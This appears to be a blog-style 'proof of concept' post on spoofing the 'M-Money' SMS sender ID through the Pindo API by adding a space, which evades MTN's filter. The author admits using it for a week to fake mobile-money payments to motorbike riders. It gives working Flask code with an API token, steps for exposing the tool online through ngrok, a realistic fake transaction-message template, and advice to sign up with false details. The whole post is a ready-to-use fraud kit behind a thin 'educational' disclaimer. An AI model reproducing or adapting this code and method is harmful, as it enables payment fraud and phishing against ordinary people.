# Proof of concept 

Hy all I Hope you're doing Great! I've got some wild news to share about the Pindo API that'll probably blow your mind. 🔥
but first i have to clear one thing out. this is for educational purposes only .. don't attempt to do something funny or you will get arrested.

So While diving deep into the tech ocean, I stumbled upon something that had me raising an eyebrow. It turns out that there's this ninja-like way users can play around with the system. By sneaking in spaces before or after a company name in messages, it's like a digital cloak that can turn anyone into a master of disguise. Cool, right?

But wait, it gets even cooler. I went ahead and put this thing to the test. Sent some money via MTN Mobile Money and guess what? The name checking seems to be on a coffee break. I kid you not, I’ve been moving around sending money to people back and forth to check if the whole thing works .. for a whole week its like I have a money tank or something 😂😂😂😂😂😂… the easiest target was motorbikes of course .. this thing was intoxicating.. Because they’re the ones who only check for the amount money that was received but never open the whole message 😆.. I don’t know why they appealed to me like an easy target TBH. 😎

But fear not, the good news is, I've got your back. I've done some digging, and MTN's firewall seems to be on the lookout for messages that scream "M-Money." That's where the magic happens to put it simply mtn's firewall rules are only set to detect message that has exactly "M-Money" as message title . Toss in a sly space, like "M-Money " and you're basically a mobile money wizard. Seriously, it's like you've sent money to someone without even breaking a sweat.

Now, here's where the plot thickens. It's a slick move for folks who've got places to be and only peek at their messages and the cash flow. Caught a few curious cats, though, ones who've got an eye for detail. Can't fool everyone, right? 😄

Now, I'm not just here to tease you with tech tales. I've got something in store. I've whipped up a POC, a proof of concept, that'll show you this slick space trick in action Check it out and let me know what you think.

```python
from flask import Flask, render_template, request, redirect, flash
from flask_wtf import FlaskForm
from wtforms import StringField, TextAreaField
from wtforms.validators import DataRequired
from flask_sqlalchemy import SQLAlchemy
import requests

app = Flask(__name__)
app.config['SECRET_KEY'] = 'idontdrinkmyownpee'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///messages.db'  # Use SQLite database
db = SQLAlchemy(app)

class SMSForm(FlaskForm):
    numbers = StringField('Phone Numbers (comma-separated)', validators=[DataRequired()])
    message = TextAreaField('Message', validators=[DataRequired()])

class Message(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    numbers = db.Column(db.String(255), nullable=False)
    message = db.Column(db.String(255), nullable=False)

PINDO_API_TOKEN = 'eyJhbGciOiJub25lIn0.eyJpZCI6OTgyLCJyZXZva2VkX3Rva2VuX2NvdW50IjowfQ.'

@app.route('/', methods=['GET', 'POST'])
def send_sms():
    form = SMSForm()

    if form.validate_on_submit():
        numbers = form.numbers.data
        message = form.message.data

        numbers_list = [num.strip() for num in numbers.split(',')]

        headers = {'Authorization': 'Bearer ' + PINDO_API_TOKEN}
        url = 'https://api.pindo.io/v1/sms/'

        with app.app_context():  # Enter the application context
            for number in numbers_list:
                data = {'to': number, 'text': message, 'sender': ' M-Money'}
                response = requests.post(url, json=data, headers=headers)

                print(f'Sending to {number}: {response.status_code}')

                # Store the sent message in the database
                new_message = Message(numbers=number, message=message)
                db.session.add(new_message)
                db.session.commit()

            flash('SMS sent successfully!', 'success')
            return redirect('/')

    return render_template('index.html', form=form)

if __name__ == '__main__':
    with app.app_context():  # Enter the application context
        db.create_all()  # Create database tables
    app.run(debug=True)
```

you can use my pindo api token for configuration but you can easily get your token when you sign in … matter of fact you don’t even have to use legitimate information … as long as you have a google account you’re good to go when you sign in to pindo you check your profile for the token and use the same token but its worth checking it out explore yourself 
then then when you run `python3 app.py` considering that you’ve name your app app.py
it runs locally on address 172.0.0.1:5000 on port 5000 because flasks projects typically runs on port 5000

and then to make the app available to the internet by port forwarding manually or use this tool(NGROK) i used ngrok of course am not gonna talk about it but you can get an account right now if you have google account [https://dashboard.ngrok.com/signup](https://dashboard.ngrok.com/signup) you can also create ngrok accoung to get their token for free without providing your personal deatails and here’s the link to download it using git clone [https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz](https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz) .. after downloading you check the file type and unzip it using gzip -d “filename” and when the unzip is done the file will come with .tar extension use tar xvf to unarchive it . and then run
`ngrok config add-authtoken "token"`  you’ll use your personal token and after configuring you run it with ./ngrok http 5000 and when you its fully operational you can copy the link provided and paste it in your browser address and then you see something like this and then you make ngrok run on the same project run on port 5000 as soon as you the local application is on the internet you get an url you input in your browser for sending messages and now when you send the message its like this …..

i used this template as a message 

`You have received 20000 RWF from UWERA MARIE CLAIRE (*********876) on your mobile money account at 2023-08-10 03:27:39. Message from sender: 1. Your new balance: 2018 RWF. Loyalty fee was 0 and loyalty reward was 0. Promotion was 0. Financial Transaction Id: 10438338079.`

of course you edit the message to make it look legitimate and when you hop on off the bike you send your imaginary money then you’re good to go.
thats was cool right?

Happy hacking.
